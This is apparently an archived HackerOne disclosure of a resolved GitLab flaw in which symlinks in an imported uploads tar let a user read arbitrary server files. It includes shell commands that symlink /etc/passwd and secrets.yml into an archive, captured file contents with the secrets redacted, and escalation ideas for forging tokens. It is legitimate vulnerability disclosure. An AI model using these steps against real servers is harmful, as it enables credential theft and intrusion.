---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/path-traversal
  - env/web
  - stack/gitlab
  - vuln/command-injection
  - trigger/file-upload
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2022-03-21
submitted: 2022-01-03T01:57:54.059Z
bounty_usd: 29000
votes: 329
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "vakzz"
source: "https://hackerone.com/reports/1439593"
title: "Arbitrary file read  via the bulk imports UploadsPipeline"
---
# Arbitrary file read  via the bulk imports UploadsPipeline

> **Severity:** Critical | **Bounty:** 29,000 USD | **Votes:** 329 | **Program:** GitLab | **Disclosed:** 2022-03-21

- Report: [https://hackerone.com/reports/1439593](https://hackerone.com/reports/1439593)
- CWE: Path Traversal
- Submitted: 2022-01-03T01:57:54.059Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary

The bulk imports api does not remove symlinks when untaring the uploads.tar.gz file, allowing arbitrary files to be read and uploaded when importing a group.

When a group has uploads (such as markdown attachments), an `uploads.tar.gz` file will be downloaded and extracted in the `UploadsPipeline`:
https://gitlab.com/gitlab-org/gitlab/-/blob/v14.6.0-ee/lib/bulk_imports/common/pipelines/uploads_pipeline.rb#L15
```ruby
       def extract(context)
          download_service(tmp_dir, context).execute
          untar_zxf(archive: File.join(tmp_dir, FILENAME), dir: tmp_dir)
          upload_file_paths = Dir.glob(File.join(tmp_dir, '**', '*'))

          BulkImports::Pipeline::ExtractedData.new(data: upload_file_paths)
        end
```

Since `untar_zxf` only changes the permissions, any symlinks that are extracted from the tar will remain and be added to the list of file paths. When `load` is called, the symlinks will be followed and used as the content for the new file:

https://gitlab.com/gitlab-org/gitlab/-/blob/v14.6.0-ee/lib/bulk_imports/common/pipelines/uploads_pipeline.rb#L23
```ruby
        def load(context, file_path)
          avatar_path = AVATAR_PATTERN.match(file_path)

          return save_avatar(file_path) if avatar_path

          dynamic_path = file_uploader.extract_dynamic_path(file_path)

          return unless dynamic_path
          return if File.directory?(file_path)

          named_captures = dynamic_path.named_captures.symbolize_keys

          UploadService.new(context.portable, File.open(file_path, 'r'), file_uploader, **named_captures).execute
        end
``` 

This can be used to read any file that the git user has read access to such as secrets.yml or other sensitive files.

### Steps to reproduce

1. Create a new group on gitlab.com
1. Create a new milestone and upload a file `passwd` with any content into the description
1. Make note of the upload secret (the 32 byte hash in the path)
1. Run the following commands to make a tar file, using the hash from above
    ```bash
mkdir ./d3209c811fee407218bff7cb3b4333e6
ln -s /etc/passwd ./d3209c811fee407218bff7cb3b4333e6/passwd
ln -s /srv/gitlab/config/secrets.yml ./d3209c811fee407218bff7cb3b4333e6/secrets.yml
tar cvzf uploads.tar.gz ./d3209c811fee407218bff7cb3b4333e6
    ```

1. Save the following simple proxy server as `api.py` and run it with `FLASK_APP=api flask run`, this will replace the `uploads.tar.gz` with a custom one: {F1565789}
1. Start [ngrok](https://ngrok.com/) so that it's externally accessible: `ngrok http 5000`
1. Create a new access token at https://gitlab.com/-/profile/personal_access_tokens
1. Create a new group, this time choose import group
1. Enter the https ngrok url and the token you just created
1. Select the group you initially created and choose a new name
1. Once the import has complete, view the milestone and click the passwd link
1. You will see the passwd file from the gitlab server
1. Copy the link and change `passwd` to `secrets.yml` and you should be able to download the secrets file


### Impact

A user with access to import a group on gitlab can read arbitrary files on the gitlab server

### Examples

Example with `passwd` and `secrets.yml` attached:
https://gitlab.com/groups/group_to_import_1/-/milestones/1
https://gitlab.com/groups/group_to_import_1/-/uploads/d3209c811fee407218bff7cb3b4333e6/passwd
https://gitlab.com/groups/group_to_import_1/-/uploads/d3209c811fee407218bff7cb3b4333e6/secrets.yml

### What is the current *bug* behavior?
Symlinks are not removed or filtered when the `UploadsPipeline` is run for the bulk imports api

### What is the expected *correct* behavior?
Symlinks should be removed similar to the project import

### Relevant logs and/or screenshots
/etc/passwd file:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
git:x:1000:1000:GitLab,,,:/home/git:/bin/bash
```

/srv/gitlab/config/secrets.yml file:
```yaml
production:
  secret_key_base: 1174116b6adee.....
  otp_key_base: staging-a680efdeb2e93751f32.....
  db_key_base: 1174116b6adee59.....
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
[REDACTED KEY BODY - see source report]
-----END RSA PRIVATE KEY-----
  ci_jwt_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
[REDACTED KEY BODY - see source report]
-----END RSA PRIVATE KEY-----


### Output of checks
This bug happens on GitLab.com

## Impact

A user with access to import a group on gitlab can read arbitrary files on the gitlab server

## Timeline

- **Report Filed**
- **2022-01-03** @vakzz: Some other interesting files that can be read are `/srv/gitlab/config/gitlab.yml` which contains all of the object store service account details, and `/etc/gitlab/registry/gitlab-registry.key` which I think would allow tokens to be generated for registry.gitlab.com.

Cheers,
Will
- **Report Vulnerability Types Updated**
- **Report Triaged**
- **2022-01-12** @gitlab-securitybot: ETA for fix:

Hi @vakzz,

The issue you reported is currently scheduled to be fixed by 2022-01-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2022-01-12** @vakzz: Thanks @gitlab-securitybot but looks like the release has just gone out, so we’ll ahead of schedule :) https://about.gitlab.com/releases/2022/01/11/security-release-gitlab-14-6-2-released/#arbitrary-file-read-via-group-import-feature

Cheers,
Will
- **Report Severity Updated**
- **Bounty Awarded**
- **Report Resolved**
- **2022-01-12** @vakzz: Hi @gitlab_cmaxim,

Awesome thanks for the bounty and quick turn around :)

Out of interest, how come this was downgraded to high? The release notes had it at a 9.6 which seems to be inline with previous file read reports.

Cheers,
Will
- **2022-01-13** @vakzz: > The release notes had it at a 9.6 which seems to be inline with previous file read reports.

Eg https://hackerone.com/reports/1132378 was a similar issue last year and was rated 9.6 even with the limitation of only reading ~250 bytes.

Cheers,
Will
- **2022-01-18** @vakzz: Hi @gitlab_cmaxim,

Any updates on my question above?

It looks like the release notes have been updated to change the Integrity to None? This seems a bit inconsistent with previous arbitrary read scores:
https://about.gitlab.com/releases/2021/03/31/security-release-gitlab-13-10-1-released/#arbitrary-file-read-during-project-import
https://about.gitlab.com/releases/2021/07/07/critical-security-release-gitlab-14-0-4-released/#arbitrary-file-read-via-design-feature

From [GitLabs scoring calculator](https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/) it mentions
> Remember, in particular, to "constrain impacts to a reasonable final impact which they are confident an attacker is able to achieve".

Since the file read would grant access to the object storage credentials (which is enabled by default for Helm installations and [recommended over NFS](https://docs.gitlab.com/ee/administration/object_storage.html#object-storage)) wouldn't the "reasonable final impact" also include read/write access those objects and hence an Integrity score of High?

The current score for this issue is less than the 8.7 given to the stored xss fixed in the same release...

Cheers,
Will
- **2022-01-25** @gitlab_cmaxim: Hello @vakzz,

Thanks for the ping and apologies for the delayed response. Let me get back to the team and discuss these details.

Regards,
Costel
- **2022-01-25** @vakzz: Hi @gitlab_cmaxim,

No worries, thanks for update :)

Cheers,
Will
- **2022-02-04** @vakzz: Hi @gitlab_cmaxim,

How are the discussions going? :) 

Cheers,
Will
- **2022-02-09** @vakzz: Hi @gitlab_cmaxim,

Sorry for all the pings, this issue has been on my mind :)

It's a bit hard to know what the main points of the discussion are, but here are a few things I've been thinking about:

* Is this issue really less severe than the stored xss `CVE-2021-39946`? I don't have a great understanding of CVSS scores but this doesn't seem quite right (was this issue treated as only P2/S2 internally?)
* Say someone just found all of GitLab's secrets and credentials for rails and the object storage buckets (maybe bundled in an unrelated iOS app :D), how would the severity of that be handled?

I've been doing a bit of testing on a helm install of GitLab to see what could be done with the file read, here are a few things I came up with aside from reading/writing to the buckets:

* Access to object storage also gives access to any GitLab backups, which contain an sql dump of the database. Since the `db_key_base` can be read, that would allow you to decrypt any `attr_encrypted` contained there:
    * `bulk_import_configurations` (has GitLab urls and tokens)
    * cluster provider details
    * application settings
    * ci variables and many more
* `Gitlab::JWTToken`'s use `db_key_base` for creating the secret which I think would allow forging multiple token types through the `TokenResolver`
* `gitlab-registry.key` can be used to generate valid catalog, repository or registry tokens for interacting directly with the docker registry api

I'm just a bit confused as to what the reasoning is for downgrading the issue after initially being announced as critical, and without knowing what is being discussed it's hard to add anything meaningful to the conversation hence the brain dump above.

I know GitLab has the final say when triaging issues, so if it's already been decided and wont be changed then that's all good.

Cheers,
Will
- **Report Severity Updated**
- **Bounty Awarded**
- **2022-02-22** @vakzz: Wow amazing, thank you!

Cheers,
Will
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2022-06-23** @vakzz: Hi @gitlab_cmaxim,

My self-hosted GitLab Ultimate License has just expired, would I be able to get it renewed?

Cheers,
Will
- **2022-06-23** @gitlab_cmaxim: Hello @vakzz,

I have requested a license to be sent to your `[username]@wearehackerone.com` email address. Please let us know if it has not been received in the next 48 hours, and we can resend it to you.

Thank you again for your interest in our program. We look forward to your future reports!

Best Regards,
Costel
GitLab Security Team
